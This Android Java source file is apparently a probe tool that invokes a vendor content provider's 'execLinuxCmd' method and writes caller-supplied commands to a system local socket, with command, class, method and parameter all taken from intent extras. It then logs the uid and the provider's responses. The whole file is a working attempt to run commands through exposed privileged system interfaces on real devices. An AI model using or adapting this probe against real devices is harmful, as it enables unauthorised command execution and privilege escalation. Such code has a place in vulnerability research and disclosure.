package com.dsh.sysprobe;

import android.app.Activity;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final String TAG = "SYSPROBE";
    private static final Uri URI = Uri.parse("content://com.tianci.provider");

    private TextView out;
    private final StringBuilder sb = new StringBuilder();

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        out = new TextView(this);
        out.setTextSize(18);
        out.setPadding(30, 30, 30, 30);
        ScrollView sv = new ScrollView(this);
        sv.addView(out);
        setContentView(sv);

        int cmdIndex = getIntent().getIntExtra("cmdIndex", 6);
        String cmdParam = getIntent().getStringExtra("cmdParam");
        String cls = getIntent().getStringExtra("cls");
        String method = getIntent().getStringExtra("method");
        if (cls == null) cls = "COMMON";
        if (method == null) method = "execLinuxCmd";
        if (cmdParam == null) cmdParam = "/data/local/tmp/probe_" + System.currentTimeMillis();

        String sockCmd = getIntent().getStringExtra("sock");
        if (sockCmd != null) {
            try {
                android.net.LocalSocket ls = new android.net.LocalSocket();
                ls.connect(new android.net.LocalSocketAddress("/data/socketsys/sys_info",
                        android.net.LocalSocketAddress.Namespace.FILESYSTEM));
                java.io.OutputStream os = ls.getOutputStream();
                java.io.InputStream is = ls.getInputStream();
                os.write((sockCmd + "\n").getBytes());
                os.flush();
                byte[] buf = new byte[4096];
                int n = is.read(buf);
                log("SOCK RECV(" + n + "): " + (n > 0 ? new String(buf, 0, n) : "(empty)"));
                ls.close();
            } catch (Throwable t) {
                log("SOCK EXCEPTION: " + t);
            }
        }
        log("uid=" + android.os.Process.myUid());
        log("cmd=" + cmdIndex + " param=" + cmdParam);
        log("cls=" + cls + " method=" + method);

        try {
            Bundle data = new Bundle();
            data.putInt("cmd", cmdIndex);
            data.putString("param", cmdParam);

            Bundle wrap = new Bundle();
            wrap.putParcelable("param", data);
            wrap.putBoolean("method_set", true);

            ContentResolver cr = getContentResolver();
            log("call(" + cls + ", " + method + ", wrap)");
            Bundle res = cr.call(URI, cls, method, wrap);
            log("RESULT: " + (res == null ? "null" : res.toString()));
            if (res != null) {
                for (String k : res.keySet()) {
                    Object v = res.get(k);
                    log("  " + k + " = " + v);
                }
            }
        } catch (Throwable t) {
            log("EXCEPTION: " + t);
            Log.e(TAG, "call failed", t);
        }
    }

    private void log(String s) {
        Log.i(TAG, s);
        sb.append(s).append("\n");
        out.setText(sb.toString());
    }
}